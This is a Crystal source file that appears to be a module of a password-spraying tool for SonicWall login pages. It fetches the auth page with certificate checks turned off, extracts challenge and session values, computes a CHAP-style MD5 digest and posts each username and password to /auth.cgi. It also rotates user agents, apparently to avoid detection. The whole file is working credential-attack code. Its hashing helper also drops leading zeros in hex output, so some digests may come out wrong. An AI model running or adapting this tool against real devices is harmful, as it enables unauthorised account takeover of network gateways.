require "http/client"
require "xml"
require "digest"


#### 
# this one used the digest !!! either use the ruby one or add the basic user/pass form option 
####

class Sonicwall_Digest < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        # 
        # enter your auth check here and make sure 
        #

        # url encode the password
        enc_pass = URI.encode_www_form password
        url = URI.parse(@target)
        # set ssl context because most dont have a public cert
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE

        # set up http client
        client = HTTP::Client.new(url, tls: context)


        # get the auth page for the id, param1,2 and sessionid 
        
        authpage = "/auth1.html"
        postpage = "/auth.cgi"

        resp = client.get(authpage)
        # puts resp.body 
        page = XML.parse_html(resp.body)
        formitems = page.xpath_node("/html/body/form")
        return if formitems.nil?
        
        
        param1 =    formitems.children()[1].attributes()[2].content()
        param2 =    formitems.children()[2].attributes()[2].content()
        id =        formitems.children()[3].attributes()[2].content()
        sessionid = formitems.children()[4].attributes()[2].content()
        
        
        postheader = HTTP::Headers{
            # "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/90.0",
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))],
            "Content-Type" => "application/x-www-form-urlencoded",
            "Cookie" => "temp=; SessId=#{sessionid}",
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate"
        }

        digest = chap_digest(id, password, param1)


        body = "id=#{id}&select2=English&uName=#{username}&pass=&digest=#{digest}"

        # now we can make our login request 
        resp = client.post(postpage, form: body, headers: postheader )

        if !resp.body.includes? "This page is redirecting! Click <A HREF=\"auth.html\">here"
            valid = true
        end



        #
        # end of your auth check here
        # 

        return [username, password, valid, lockedout, mfa]
    end




    ## put extra functions n stuff down here ## 






############################
# weird chap/md5 stuff here 
############################




    #completely working 
    private def md5_hash(val : String) : String
        thing = Digest::MD5.new()
        thing << val
        # puts "hash: #{thing.hash}"
        str = ""
        temp = thing.final()
        # puts temp
        temp.each do |byte| 
            str += "%x" % [byte] 
        end
        str
    end

    private def to_slice(arr)
        Slice.new(arr.size) {|i| arr[i]}
    end


    private def md5_hash(val : Array(UInt8))
        vall = to_slice(val)
        thing = Digest::MD5.new()
        # val.each do |byte| 
        #     thing << byte 
        # end
        thing << vall
        # puts "hash: #{thing.hash}"
        str = ""
        temp = thing.final()
        # puts temp
        temp.each do |byte| 
            str += "%x" % [byte] 
        end
        str
    end

    private def s_to_bytes(s : String) 
        array = [] of UInt8
        ar = s.split("")
        while ar.size > 0 
            a = ar.shift()
            b = ar.shift()
            # puts "#{a}#{b}"   
            array << "#{a}#{b}".to_u8(16)
        end
        array
    end


    private def chap_digest(id : String, password : String, challange : String) : String
        id_t = s_to_bytes(id)
        # pass_t = s_to_bytes(password)
        pass_t = password.split("").map(&.bytes[0])
        chal_t = s_to_bytes(challange)

        all = id_t + pass_t + chal_t
        # puts all.class
        val = md5_hash(all)
    end






















end